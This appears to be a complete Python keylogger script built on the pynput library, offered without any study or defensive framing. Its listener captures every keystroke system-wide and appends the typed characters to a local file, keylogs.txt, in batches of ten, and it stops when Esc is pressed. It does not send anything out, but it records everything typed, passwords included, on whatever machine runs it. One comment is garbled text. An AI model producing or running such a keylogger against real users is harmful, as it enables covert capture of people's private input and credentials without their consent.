import pynput

from pynput.keyboard import Key, Listener

keys = []
count = 0


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open('keylogs.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            # checks if the space bar is pressed            
            if k.find("space") > 0:
                f.write('\n')
            # if key does not exist then 
            elif k.find('Key') == -1:
                f.write(k)

def on_release(key):
    # This will break out of the key logssdssd  sa we
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


# requirements
# pip install pynput